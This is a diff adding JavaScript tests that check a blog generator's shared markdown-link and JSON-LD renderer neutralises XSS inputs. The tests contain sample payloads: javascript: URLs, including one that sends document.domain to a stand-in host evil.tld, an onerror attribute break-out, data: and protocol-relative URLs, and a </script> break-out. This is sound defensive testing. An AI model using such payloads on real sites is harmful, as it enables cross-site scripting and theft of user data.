@@ -16,6 +16,7 @@ const os = require('os');
 const path = require('path');
 
 const posts = require('./update-posts.js');
+const lib = require('./lib.js');
 
 let passed = 0;
 let failed = 0;
@@ -231,6 +232,68 @@ test('escapes titles and drops unsafe URLs, keeping the title as text', () => {
   assert.ok(!/javascript:/i.test(html), 'javascript: URL survived');
   assert.ok(html.includes('&lt;script&gt;'), 'title should still appear, escaped');
   assert.ok(!html.includes('<a href'), 'unsafe entry must not be linked');
+});
+
+// ---------------------------------------------------------------------------
+// The secgate review (2026-08-09) found the URL guard had reached 7 of 9 sinks:
+// update-blog.js and update-library.js rendered markdown links and images
+// straight into attributes. The suite could not have caught it because it only
+// imported update-posts.js. These test the shared renderer both now use.
+console.log('\nrenderMarkdownLinks (shared by update-blog and update-library)');
+
+test('renders a normal link and image', () => {
+  assert.strictEqual(
+    lib.renderMarkdownLinks('[text](https://example.com/p)'),
+    '<a href="https://example.com/p">text</a>'
+  );
+  assert.strictEqual(
+    lib.renderMarkdownLinks('![alt](https://example.com/i.png)'),
+    '<img src="https://example.com/i.png" alt="alt">'
+  );
+});
+
+test('a javascript: link degrades to plain text', () => {
+  const out = lib.renderMarkdownLinks("[click](javascript:location='//evil.tld/'+document.domain)");
+  assert.ok(!/javascript:/i.test(out), `javascript: survived: ${out}`);
+  assert.ok(!out.includes('<a '), 'must not emit an anchor');
+  assert.ok(out.includes('click'), 'link text should survive');
+});
+
+test('a javascript: image degrades to its alt text', () => {
+  const out = lib.renderMarkdownLinks('![pic](javascript:alert(1))');
+  assert.ok(!/javascript:/i.test(out), `javascript: survived: ${out}`);
+  assert.ok(!out.includes('<img'), 'must not emit an img');
+});
+
+test('an attribute break-out cannot escape the src', () => {
+  // The percent-decode path could reintroduce a literal quote.
+  const out = lib.renderMarkdownLinks('![x](https://e.com/a.png" onerror="alert(1))');
+  assert.ok(!/onerror\s*=\s*"?alert/.test(out.replace(/&quot;/g, '"').replace(/&#39;/g, "'")) ||
+            !out.includes('<img'), `break-out survived: ${out}`);
+});
+
+test('protocol-relative and data URLs are refused', () => {
+  for (const bad of ['[a](//evil.example/x)', '[a](data:text/html,<script>alert(1)</script>)']) {
+    const out = lib.renderMarkdownLinks(bad);
+    assert.ok(!out.includes('<a '), `should not link: ${bad} -> ${out}`);
+  }
+});
+
+// ---------------------------------------------------------------------------
+console.log('\njsonLdScript');
+
+test('neutralises a </script> breakout inside JSON-LD', () => {
+  const out = lib.jsonLdScript({ name: '</script><img src=x onerror=alert(1)>' });
+  assert.ok(!out.includes('</script>'), 'raw </script> survived into a script element');
+  assert.ok(out.includes('\\u003c'), 'expected < to be unicode-escaped');
+  assert.doesNotThrow(() => JSON.parse(out), 'output must still be valid JSON');
+});
+
+test('a trailing backslash still produces parseable JSON', () => {
+  // update-blog.js used escapeHtml inside JSON string literals, which left
+  // backslashes unescaped and could emit unparseable JSON-LD.
+  const out = lib.jsonLdScript({ title: 'ends with a backslash \\' });
+  assert.doesNotThrow(() => JSON.parse(out));
 });
 
 // ---------------------------------------------------------------------------
